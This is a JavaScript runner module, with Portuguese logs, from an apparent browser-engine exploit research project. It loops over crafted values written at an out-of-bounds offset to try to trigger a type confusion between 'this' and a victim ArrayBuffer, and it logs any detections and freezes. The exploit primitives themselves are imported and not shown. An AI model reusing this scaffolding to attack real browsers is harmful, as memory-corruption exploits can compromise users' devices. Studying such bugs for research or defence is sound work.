// js/script3/runAllAdvancedTestsS3.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3 } from './s3_utils.mjs';
import { getOutputAdvancedS3, getRunBtnAdvancedS3 } from '../dom_elements.mjs';
// Atualizar importação para a nova função de teste
import { executeAttemptThisConfusionWithValue, current_toJSON_call_count_for_TypeError_test } from './testJsonTypeConfusionUAFSpeculative.mjs';
import { OOB_CONFIG } from '../config.mjs'; 
import { toHex } from '../utils.mjs';     

async function runAttemptThisConfusionWithVariousValues() {
    const FNAME_RUNNER = "runAttemptThisConfusionWithVariousValues";
    logS3(`==== INICIANDO Testes de Type Confusion ('this' se torna victim_ab?) com Valores OOB Variados ====`, 'test', FNAME_RUNNER);

    const criticalOffset = (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16; // 0x70

    const valuesToTest = [
        { desc: "Val_FFFFFFFF", val: 0xFFFFFFFF },
        { desc: "Val_00000000", val: 0x00000000 },
        { desc: "Val_41414141", val: 0x41414141 },
        { desc: "Val_00000001", val: 0x00000001 }
        // Adicione mais valores aqui se desejar
    ];

    for (const testCase of valuesToTest) {
        const testDescription = `TC_this_OOB_${testCase.desc}_at_${toHex(criticalOffset)}`;
        logS3(`\n--- Executando Teste: ${testDescription} ---`, 'subtest', FNAME_RUNNER);
        
        let result = await executeAttemptThisConfusionWithValue(
            testDescription,
            testCase.val,
            criticalOffset
        );

        if (result.errorOccurred) {
            logS3(`   RESULTADO ${testDescription}: ERRO JS CAPTURADO: ${result.errorOccurred.name} - ${result.errorOccurred.message}. Chamadas toJSON: ${result.calls}`, "error", FNAME_RUNNER);
        } else if (result.potentiallyCrashed) {
            logS3(`   RESULTADO ${testDescription}: CONGELAMENTO POTENCIAL. Chamadas toJSON: ${result.calls}`, "error", FNAME_RUNNER);
        } else {
            logS3(`   RESULTADO ${testDescription}: Completou sem erro explícito. Chamadas toJSON: ${result.calls}`, "good", FNAME_RUNNER);
            if (result.tcDetected) {
                logS3(`      !!!!!! TYPE CONFUSION DE 'this' PARA victim_ab FOI DETECTADA !!!!!!`, "critical", FNAME_RUNNER);
            } else {
                logS3(`      Type confusion de 'this' para victim_ab NÃO foi detectada.`, "info", FNAME_RUNNER);
            }
        }
        logS3(`   Título da página ao final de ${testDescription}: ${document.title}`, "info");
        await PAUSE_S3(MEDIUM_PAUSE_S3);

        if (document.title.startsWith("CONGELOU TC?")) {
            logS3("Congelamento detectado, interrompendo próximos testes de TC.", "error", FNAME_RUNNER);
            break;
        }
    }

    logS3(`==== Testes de Type Confusion ('this') com Valores OOB Variados CONCLUÍDOS ====`, 'test', FNAME_RUNNER);
}

export async function runAllAdvancedTestsS3() {
    const FNAME = 'runAllAdvancedTestsS3_AttemptThisTC';
    const runBtn = getRunBtnAdvancedS3();
    const outputDiv = getOutputAdvancedS3();

    if (runBtn) runBtn.disabled = true;
    if (outputDiv) outputDiv.innerHTML = '';

    logS3(`==== INICIANDO Script 3: Tentativa de Type Confusion ('this' se torna victim_ab?) ====`,'test', FNAME);
    document.title = "Iniciando Script 3 - TC 'this'";
    
    await runAttemptThisConfusionWithVariousValues();

    logS3(`\n==== Script 3 CONCLUÍDO (Tentativa de Type Confusion 'this') ====`,'test', FNAME);
    if (runBtn) runBtn.disabled = false;
    
    if (document.title.startsWith("Iniciando") || document.title.startsWith("CONGELOU?")) {
        // Manter
    } else if (document.title.includes("ERRO")) {
        // Manter título de erro
    } else if (document.title.includes("TC DETECTADA") || document.title.includes("TC + SIZE")) {
        // Manter título de sucesso/alerta
    }
    else {
        document.title = "Script 3 Concluído - TC 'this'";
    }
}
